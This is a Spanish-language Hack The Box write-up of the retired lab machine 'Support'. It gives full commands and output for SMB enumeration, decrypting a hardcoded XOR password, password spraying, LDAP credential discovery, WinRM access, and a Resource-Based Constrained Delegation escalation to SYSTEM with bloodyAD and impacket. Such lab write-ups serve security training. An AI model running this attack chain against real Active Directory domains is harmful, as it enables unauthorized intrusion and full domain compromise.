# Writeup: Support (Hack The Box — Retirada)

Support es una máquina **Fácil** es un entorno Active Directory con múltiples servicios expuestos. El recorrido comienza con la enumeración de recursos SMB, donde se descubre un recurso compartido con herramientas de soporte. Entre ellas, se encuentra un ejecutable `.NET` que contiene una contraseña ofuscada mediante XOR con una clave *hardcoded*. Al descifrarla, se obtienen credenciales válidas para el usuario `ldap`. Con estas credenciales, se realiza una búsqueda en LDAP que revela la contraseña del usuario `support`, quien tiene acceso por WinRM. Finalmente, mediante **BloodHound** se identifica un permiso `GenericAll` sobre el controlador de dominio, lo que permite explotar un ataque de **Resource-Based Constrained Delegation (RBCD)** y escalar a `NT AUTHORITY\SYSTEM`.

---

## Fase 1: Reconocimiento

Lanzamos un escaneo completo de puertos con Nmap:

```bash
sudo nmap -sS -p- --min-rate 500 -n -Pn -vvv 10.129.230.181 -oG allPorts
```

**Resultado:**

```bash
Completed SYN Stealth Scan at 20:05, 276.63s elapsed (65535 total ports)
Nmap scan report for 10.129.230.181
Host is up, received user-set (0.14s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49678/tcp open  unknown          syn-ack ttl 127
49683/tcp open  unknown          syn-ack ttl 127
49706/tcp open  unknown          syn-ack ttl 127
49744/tcp open  unknown          syn-ack ttl 127
```

Usamos la funcionalidad `extractPorts` para extraer la IP y los puertos abiertos:

```bash
extractPorts allPorts
```

```bash
[*] Extrayendo información...

        [*] Dirección IP: 10.129.230.181
        [*] Puertos abiertos: 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49678,49683,49706,49744

[*] Puertos copiados al portapapeles
```

Realizamos un escaneo de servicios y versiones:

```bash
nmap -sVC -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49678,49683,49706,49744 10.129.230.181 -oN targeted
```

**Resultados clave:**

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb)
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```

**Observaciones clave:**

- **Dominio**: `support.htb`
- **Controlador**: `DC.support.htb`
- **WinRM habilitado** en el puerto 5985.
- **Firma SMB** habilitada y requerida.

Añadimos el dominio a `/etc/hosts`:

```bash
echo "10.129.230.181 DC.support.htb support.htb" >> /etc/hosts
```

---

## Fase 2: Enumeración de usuarios y recursos compartidos

### Enumeración de usuarios con `rpcclient`

Intentamos enumerar usuarios con `rpcclient` en sesión nula:

```bash
rpcclient -U "" -N support.htb -c "enumdomusers"
```

```bash
result was NT_STATUS_ACCESS_DENIED
```

El acceso está denegado, lo que indica que el controlador de dominio no permite la enumeración anónima de usuarios.

### Enumeración de recursos SMB

Probamos autenticación nula con el usuario `guest`:

```bash
nxc smb support.htb -u 'guest' -p '' --shares
```

```bash
SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.230.181  445    DC               [+] support.htb\guest: 
SMB         10.129.230.181  445    DC               [*] Enumerated shares
SMB         10.129.230.181  445    DC               Share           Permissions     Remark
SMB         10.129.230.181  445    DC               -----           -----------     ------
SMB         10.129.230.181  445    DC               ADMIN$                          Remote Admin
SMB         10.129.230.181  445    DC               C$                              Default share
SMB         10.129.230.181  445    DC               IPC$            READ            Remote IPC
SMB         10.129.230.181  445    DC               NETLOGON                        Logon server share 
SMB         10.129.230.181  445    DC               support-tools   READ            support staff tools
SMB         10.129.230.181  445    DC               SYSVOL                          Logon server share
```

El recurso `support-tools` tiene permisos de **lectura** para invitados. Es un hallazgo interesante.

---

## Fase 3: Enumeración del recurso `support-tools`

Conectamos al recurso compartido usando `smbclient`:

```bash
smbclient //support.htb/support-tools -U guest%
```

```bash
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 20 13:01:06 2022
  ..                                  D        0  Sat May 28 07:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe   A 44398000  Sat May 28 07:19:43 2022
```

El archivo `UserInfo.exe.zip` llama la atención por su nombre. Lo descargamos:

```bash
smb: \> get UserInfo.exe.zip
```

---

## Fase 4: Análisis del archivo `UserInfo.exe`

Descomprimimos el archivo:

```bash
unzip UserInfo.exe.zip -d UserInfo-extracted
```

Usando la extensión de Visual Studio **ILSpy** (o `dnSpy`), descompilamos el ejecutable. Encontramos la siguiente clase `Protected`:

```csharp
using System;
using System.Text;

namespace UserInfo.Services;

internal class Protected
{
    private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
    private static byte[] key = Encoding.ASCII.GetBytes("armando");

    public static string getPassword()
    {
        byte[] array = Convert.FromBase64String(enc_password);
        byte[] array2 = array;
        for (int i = 0; i < array.Length; i++)
        {
            array2[i] = (byte)(array[i] ^ key[i % key.Length] ^ 0xDF);
        }
        return Encoding.Default.GetString(array2);
    }
}
```

### Análisis del código

El código contiene una contraseña ofuscada con los siguientes elementos:

- **`enc_password`**: Cadena codificada en Base64.
- **`key`**: Clave fija `"armando"` hardcodeada en el código.
- **Algoritmo**: XOR bit a bit con la clave (cíclicamente) y un valor estático `0xDF`.

**Vulnerabilidad**: La clave está en texto plano y el algoritmo XOR es trivial de revertir. Cualquier persona con acceso al binario puede extraer la contraseña original.

### Script de descifrado

Creamos el siguiente script en Python para obtener la contraseña:

```python
import base64

# Datos extraídos del código C#
enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"

# 1. Decodificar Base64
encrypted_bytes = bytearray(base64.b64decode(enc_password))

# 2. Aplicar la lógica XOR inversa (XOR es simétrica)
for i in range(len(encrypted_bytes)):
    encrypted_bytes[i] ^= key[i % len(key)] ^ 0xDF

# 3. Convertir a texto e imprimir
print("Contraseña descifrada:", encrypted_bytes.decode('utf-8', errors='replace'))
```

```bash
python3 exploit.py
```

```bash
Contraseña descifrada: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

Obtenemos la contraseña: **`nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`**.

---

## Fase 5: Enumeración de usuarios con RID Brute Force

Con las credenciales recién obtenidas, realizamos un ataque de **RID Brute Force** para listar usuarios del dominio:

```bash
nxc smb support.htb -u 'guest' -p '' --rid
```

**Usuarios descubiertos:**

```
ldap
support
smith.rosario
hernandez.stanley
wilson.shelby
anderson.damian
thomas.raphael
levine.leopoldo
raven.clifton
bardot.mary
cromwell.gerard
monroe.david
west.laura
langley.lucy
daughtler.mabel
stoll.rachelle
ford.victoria
```

Guardamos la lista en `usernames.txt`.

### Password Spraying

Probamos la contraseña obtenida contra todos los usuarios descubiertos:

```bash
nxc smb support.htb -u usernames.txt -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --continue-on-success
```

```bash
SMB         10.129.230.181  445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

El usuario `ldap` es válido con esa contraseña.

---

## Fase 6: Enumeración LDAP y descubrimiento de credenciales

Con las credenciales del usuario `ldap`, realizamos una búsqueda en LDAP para encontrar información adicional:

```bash
ldapsearch -x -H ldap://10.129.230.181 \
  -D 'ldap@support.htb' \
  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b 'DC=support,DC=htb' \
  '(objectCategory=person)' \
  sAMAccountName description info userPassword
```

**Resultado clave:**

```bash
# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
info: Ironside47pleasure40Watchful
sAMAccountName: support
```

El atributo `info` del usuario `support` contiene su contraseña en texto plano: **`Ironside47pleasure40Watchful`**.

---

## Fase 7: Acceso como `support` por WinRM

Verificamos que el usuario `support` tiene acceso por WinRM:

```bash
nxc winrm support.htb -u 'support' -p 'Ironside47pleasure40Watchful'
```

```bash
WINRM       10.129.230.181  5985   DC               [+] support.htb\support:Ironside47pleasure40Watchful (Pwn3d!)
```

Nos conectamos usando `evil-winrm`:

```bash
evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
```

```powershell
*Evil-WinRM* PS C:\Users\support> whoami
support\support
```

```powershell
*Evil-WinRM* PS C:\Users\support> tree /f C:\Users\support
C:\Users\support
+---Desktop
¦       user.txt
¦
+---Documents
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
+---Videos
```

Obtenemos la **flag de usuario** (`user.txt`).

---

## Fase 8: Enumeración con BloodHound

Tras una enumeración manual del sistema, decidimos usar **BloodHound** para identificar posibles rutas de escalada de privilegios. Desde nuestra máquina Kali, ejecutamos el colector:

```bash
bloodhound-python -u support -p 'Ironside47pleasure40Watchful' -d support.htb -ns 10.129.230.181 -c All
```

Tras importar los datos en BloodHound, encontramos lo siguiente:

![BloodHound - Ruta de escalada RBCD](./assets/bloodhound-rbcd.png)

**Hallazgo crítico:**

- El usuario `support` pertenece al grupo **`Shared Support Account`**.
- Los miembros de este grupo tienen permiso **`GenericAll`** sobre el objeto del controlador de dominio (`DC.support.htb`).
- Este permiso permite a `support` modificar el atributo **`msDS-AllowedToActOnBehalfOfOtherIdentity`** del DC, lo que habilita un ataque de **Resource-Based Constrained Delegation (RBCD)**.

### ¿Qué es el ataque Resource-Based Constrained Delegation (RBCD)?

El ataque RBCD permite a un atacante que tiene control sobre una cuenta de equipo (o privilegios para crearla) delegar autenticación desde cualquier usuario a un servicio específico. En este caso, el permiso `GenericAll` sobre el DC permite modificar su atributo de delegación, añadiendo una cuenta de equipo controlada por el atacante como *trusted to authenticate*.

**Flujo del ataque:**

1. El atacante crea una cuenta de equipo falsa (FAKEPC).
2. Modifica el atributo `msDS-AllowedToActOnBehalfOfOtherIdentity` del DC para que confíe en FAKEPC.
3. Usando la extensión Kerberos **S4U2Self** y **S4U2Proxy**, el atacante solicita un ticket de servicio para el DC en nombre de `Administrator`.
4. Obtiene un ticket de servicio válido para `Administrator` y lo usa para autenticarse como administrador del dominio.

---

## Fase 9: Escalada de privilegios — RBCD

### 1. Crear una cuenta de equipo falsa

```bash
bloodyAD --host 10.129.230.181 -d support.htb -u support -p 'Ironside47pleasure40Watchful' add computer FAKEPC 'Password123!'
```

```bash
[+] FAKEPC$ created
```

### 2. Configurar RBCD en el DC

```bash
bloodyAD --host 10.129.230.181 -d support.htb -u support -p 'Ironside47pleasure40Watchful' add rbcd 'DC$' 'FAKEPC$'
```

```bash
[!] No security descriptor has been returned, a new one will be created
[+] FAKEPC$ can now impersonate users on DC$ via S4U2Proxy
[+] e.g. badS4U2proxy 'kerberos+pw://support.htb\support:Ironside47pleasure40Watchful@10.129.230.181/?serverip=10.129.230.181' 'HOST/DC$@support.htb' 'Administrator@support.htb'
```

### 3. Solicitar un ticket de servicio para `Administrator`

```bash
impacket-getST support.htb/FAKEPC$:'Password123!' -spn cifs/DC.support.htb -impersonate Administrator -dc-ip 10.129.230.181
```

```bash
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache
```

### 4. Configurar la variable de entorno Kerberos

```bash
export KRB5CCNAME=Administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache
```

### 5. Conectarse como `NT AUTHORITY\SYSTEM`

Usamos `impacket-psexec` con autenticación Kerberos:

```bash
impacket-psexec support.htb/Administrator@DC.support.htb -k -no-pass -dc-ip 10.129.230.181
```

```bash
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on DC.support.htb.....
[*] Found writable share ADMIN$
[*] Uploading file UiMJtMtB.exe
[*] Opening SVCManager on DC.support.htb.....
[*] Creating service yBfY on DC.support.htb.....
[*] Starting service yBfY.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

¡Obtenemos acceso como **`NT AUTHORITY\SYSTEM`**!

```bash
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
[REDACTED]
```

Obtenemos la **flag de root**.

---

## Conclusión

Support es una máquina **Fácil** que combina:

1. **Enumeración SMB** para descubrir un recurso compartido con herramientas de soporte.
2. **Análisis de código .NET** para extraer una contraseña ofuscada mediante XOR.
3. **RID Brute Force** y **Password Spraying** para validar credenciales del usuario `ldap`.
4. **Enumeración LDAP** para descubrir la contraseña del usuario `support` en el atributo `info`.
5. **Acceso WinRM** como `support` y obtención de la flag de usuario.
6. **BloodHound** para identificar un permiso `GenericAll` sobre el DC.
7. **Resource-Based Constrained Delegation (RBCD)** para escalar a `NT AUTHORITY\SYSTEM`.
8. **Obtención de la flag de root**.

---

## Lecciones aprendidas

1. **Los recursos compartidos SMB no deben ser accesibles por invitados**  
   El recurso `support-tools` era legible por el usuario invitado, lo que permitió descargar un ejecutable con credenciales ofuscadas.

2. **La ofuscación no es seguridad**  
   Aunque la contraseña estaba ofuscada con XOR y Base64, la clave estaba hardcodeada en el código. Un atacante puede revertir fácilmente este tipo de ofuscación.

3. **Las contraseñas en atributos LDAP son un riesgo crítico**  
   El atributo `info` del usuario `support` contenía su contraseña en texto plano. Los atributos LDAP no deben almacenar información sensible.

4. **BloodHound es esencial para identificar rutas de escalada en AD**  
   Sin BloodHound, el permiso `GenericAll` sobre el DC habría sido difícil de encontrar manualmente.

5. **Resource-Based Constrained Delegation (RBCD) es un vector de escalada crítico**  
   El permiso `GenericAll` sobre un controlador de dominio permite a un atacante configurar RBCD y obtener acceso como cualquier usuario del dominio.

6. **El principio de mínimo privilegio debe aplicarse rigurosamente**  
   El usuario `support` no debería tener permisos para modificar el controlador de dominio. Restringir los permisos ACL en objetos críticos es fundamental.
